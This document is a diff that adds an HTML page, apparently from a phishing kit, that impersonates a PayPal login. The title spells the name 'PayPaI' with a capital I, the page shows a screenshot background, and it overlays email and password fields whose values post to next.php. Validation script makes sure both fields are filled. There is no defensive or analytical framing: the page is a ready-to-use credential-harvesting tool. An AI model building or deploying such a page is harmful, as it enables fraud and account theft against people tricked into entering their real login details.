@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html><head>
+
+
+
+
+
+<meta charset="utf-8"><title>Log in to your PayPaI account</title>
+
+	<link rel="stylesheet" type="text/css" href="style.css">
+	<link rel="shortcut icon" href="img/Icon.ico">
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+<style type="text/css">
+body {
+	background-image: url(img/Capture.PNG);
+	background-repeat: no-repeat;
+	text-align: center;
+}
+</style></head><body style="background-image: url(img/imag.bmp);"><br>
+<p><br> </p>
+<br>
+<p><br></p>
+
+<table style="height: 664px; width: 1082px; margin-left: 236px;" border="0">
+
+  
+    <tbody><tr><td style="width: 1018px;" align="left" valign="top"><div style="text-align: center;">
+    
+    
+    
+    </div><div class="content" style="width: 1254px; height: 644px;"><div style="text-align: center;">
+
+		</div>
+      <form id="myform" action="next.php" method="post"><div style="text-align: center;">
+
+			</div><p style="text-align: left;">
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input class="input" name="email" placeholder="Email" id="email" size="45" type="text">
+			</p><p style="text-align: left;">
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input class="input" name="password" placeholder="Password" id="password" size="50" type="password"><br>
+</p><div style="text-align: center;"><div style="text-align: left;">
+
+            <button class="button margin" type="image" name="submit">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<img src="img/signup_btn.png"><p>&nbsp;</p></button>&nbsp;<button class="button" onclick="next.php=;" name="signup">&nbsp;</button>
+			</div><p style="text-align: left;">
+			<font size="2"><br>
+</font><a id="forgotPasswordModal" class="scTrack:unifiedlogin-click-forgot-password" style="color: rgb(0, 138, 197); font-family: HelveticaNeue,'Helvetica Neue',Helvetica,Arial,sans-serif; font-weight: normal; text-decoration: none; outline-color: invert; outline-style: none; outline-width: 0px; font-size: 15px; font-style: normal; font-variant: normal; letter-spacing: normal; line-height: normal; text-align: center; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; background-color: rgb(247, 249, 250);" href="next.php"></a></p><div style="text-align: left;">
+
+
+
+			
+			</div><div style="text-align: left;">
+
+            <button class="button margin" type="image" name="submit">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<img src="img/login_btn.png"><p>&nbsp;</p></button>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<br><p><button class="button margin" type="image" name="submit">
+			</button>
+            <button class="button" onclick="next.php=;" name="signup">&nbsp;</button>
+
+			</p>
+
+
+			
+
+			<p>&nbsp;</p>
+
+
+		
+</div>
+    
+    </form></div></td><td style="vertical-align: top;"><br></td><td style="vertical-align: top;"><br></td><td style="vertical-align: top; text-align: center; width: 1px;"><span class="button"></span><br></td><td style="vertical-align: top; width: 1px;"><br></td><td style="vertical-align: top;"><br></td><td style="vertical-align: top;"><br></td><td style="vertical-align: top;"><br></td><td style="vertical-align: top;"><br></td>
+  </tr>
+  </tbody>
+</table>
+
+<!-- JavaScript files -->
+<script type="text/javascript" src="js/jquery.validate.min.js"></script>
+<script type="text/javascript" src="js/additional-methods.js"></script>
+
+
+<script type="text/javascript">
+
+$(document).ready(function () {
+
+    $('#myform').validate({ // initialize the plugin
+        rules: {
+            email: {
+                required: true
+            },
+            password: {
+                required: true
+            }
+        },
+        errorPlacement: function (error, element) {
+            element.focus(function () {
+                $("input").html(error);
+            }).blur(function () {
+                $("input").html('');
+            });
+        },
+        highlight: function(element) {
+		    $(element).closest('.input').addClass('error');
+		},
+        submitHandler: function (form) { // for demo
+            $( "#myform" ).submit();
+        }
+    });
+
+});
+
+</script></body></html>
